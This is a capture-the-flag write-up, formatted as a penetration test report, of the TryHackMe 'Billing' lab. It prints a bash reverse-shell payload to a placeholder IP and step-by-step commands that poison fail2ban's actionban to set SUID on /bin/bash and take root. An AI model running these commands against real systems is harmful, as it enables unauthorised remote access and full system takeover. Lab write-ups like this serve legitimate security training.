# Penetration Testing Report: TryHackMe - Billing

## Executive Summary
This report outlines the successful exploitation path for the TryHackMe "Billing" machine. The system was compromised by chaining a Remote Code Execution (RCE) vulnerability in a web-based billing application to gain initial access, followed by exploiting a misconfigured `sudo` permission on the `fail2ban-client` utility to achieve complete system compromise (`root`).

## 1. Initial Enumeration
The engagement began with a standard port scan using `nmap`. 
- **Key Findings:** The scan revealed multiple open ports, notably including an Asterisk PBX service (port 5038) and a web server hosting the MagnusBilling application. 
- **Analysis:** The presence of MagnusBilling provided a primary vector for web-level exploitation.

## 2. Initial Access (Remote Code Execution)
A Remote Code Execution vulnerability was identified within the MagnusBilling web interface. 
- **Verification:** The vulnerability was confirmed by injecting a `sleep 30` command, which successfully delayed the server's response, proving command execution capabilities.
- **Exploitation:** Standard reverse shell payloads initially failed due to web application character filtering and environment constraints. The restriction was bypassed by using an explicitly invoked bash shell payload: `bash -c 'bash >& /dev/tcp/<IP>/4444 0>&1'`. 
- **Result:** A reverse shell was caught, granting access as the low-privileged service account `asterisk`.

## 3. Privilege Escalation: Fail2Ban Misconfiguration
With an initial foothold established, the focus shifted to internal enumeration for privilege escalation. 

### 3.1. Discovery
Executing `sudo -l` revealed that the `asterisk` user was permitted to run the binary `/usr/bin/fail2ban-client` as `root` without requiring a password.

### 3.2. Vulnerability Explanation
Fail2Ban is an intrusion prevention framework that monitors server logs for malicious activity. When a threshold is met (e.g., too many failed logins), it places the offending IP address into a "jail" and executes an "action" to block it. 

These actions are defined as shell commands inside configuration files (typically `/etc/fail2ban/action.d/`). Because the `asterisk` user could execute `fail2ban-client` as `root`, it was possible to force the service to load a custom configuration file where the standard firewall-blocking command was replaced with a malicious privilege escalation payload.

### 3.3. Exploitation Steps
To bypass the lack of an interactive terminal editor (TTY limitations with Netcat), command-line text processing tools were utilized:

1. **Creating a Writable Workspace:** The standard Fail2Ban configuration directory was copied to a writable location to allow modifications.
   ```bash
   cp -r /etc/fail2ban /tmp/my_fail2ban
   ```
   
2. **Poisoning the Configuration (The Exploit):** The `sed` (Stream Editor) utility was used to search all action configuration files and replace the legitimate `actionban` command with a payload designed to set the SUID bit on the bash binary.
   ```bash
   sed -i 's/^actionban =.*/actionban = chmod +s \/bin\/bash/' /tmp/my_fail2ban/action.d/*.conf
   ```
   
3. **Reloading the Service:** The `fail2ban-client` was executed via `sudo` using the absolute path to bypass the password prompt. The `-c` flag was used to point the service to the newly poisoned configuration directory in `/tmp`.
   ```bash
   sudo /usr/bin/fail2ban-client -c /tmp/my_fail2ban reload
   ```
   
4. **Triggering the Payload:** A manual IP ban was triggered in an active jail (e.g., `asterisk`).
   ```bash
   sudo /usr/bin/fail2ban-client set asterisk banip 127.0.0.1
   ```
   
### 3.4. Result
Upon triggering the ban, the poisoned `actionban` executed as `root`. This applied the SUID bit to `/bin/bash` (`-rwsr-xr-x`). Complete system control was achieved by dropping into the shell:
```bash
/bin/bash -p
```

**System fully compromised.**
